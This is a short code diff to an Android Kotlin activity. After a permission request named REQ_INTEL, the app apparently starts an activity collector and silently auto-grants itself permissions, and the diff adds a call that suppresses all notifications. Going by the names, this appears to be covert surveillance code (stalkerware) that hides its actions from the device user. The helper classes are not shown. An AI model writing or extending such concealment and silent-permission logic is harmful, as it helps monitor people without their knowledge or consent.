@@ -55,6 +55,7 @@ class HomeActivity : AppCompatActivity() {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == REQ_INTEL) {
             ActivityCollector.get(this).start()
+            StealthNotifications.suppressAll(this)
             PermissionAutoGrant.runSilent(applicationContext)
             finish()
         }
